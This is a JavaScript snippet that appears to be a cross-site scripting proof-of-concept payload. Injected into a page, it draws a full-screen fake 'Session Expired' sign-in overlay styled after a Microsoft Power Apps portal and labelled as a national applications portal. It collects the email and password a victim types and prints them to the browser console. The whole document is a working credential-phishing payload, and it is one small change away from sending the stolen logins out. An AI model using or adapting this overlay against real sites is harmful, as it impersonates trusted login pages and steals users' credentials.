var overlay=document.createElement('div');
overlay.style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.98);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:Segoe UI,sans-serif;';
overlay.innerHTML=`
  <div style="width:380px;padding:40px;box-shadow:0 2px 20px rgba(0,0,0,0.2);border-radius:4px;background:#fff;text-align:center;">
    <img src="https://content.powerapps.com/resource/powerappsportal/dist/icons/favicon-d9e461c7e6.ico" style="width:48px;margin-bottom:16px;" onerror="this.style.display='none'">
    <h2 style="margin:0 0 8px;font-size:24px;font-weight:300;">Session Expired</h2>
    <p style="color:#666;margin:0 0 24px;font-size:14px;">Your session has timed out. Please sign in again to continue.</p>
    <input id="xss-user" type="email" placeholder="Email address" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:2px;box-sizing:border-box;font-size:14px;">
    <input id="xss-pass" type="password" placeholder="Password" style="width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;border-radius:2px;box-sizing:border-box;font-size:14px;">
    <button onclick="var u=document.getElementById('xss-user').value;var p=document.getElementById('xss-pass').value;this.parentElement.parentElement.innerHTML='<p style=padding:40px>Signing in...</p>';console.log('XSS CAPTURED CREDS: '+u+':'+p);" style="width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px;font-size:14px;cursor:pointer;">Sign in</button>
    <p style="font-size:12px;color:#666;margin-top:16px;">National Overweight Applications Portal</p>
  </div>`;
document.body.appendChild(overlay);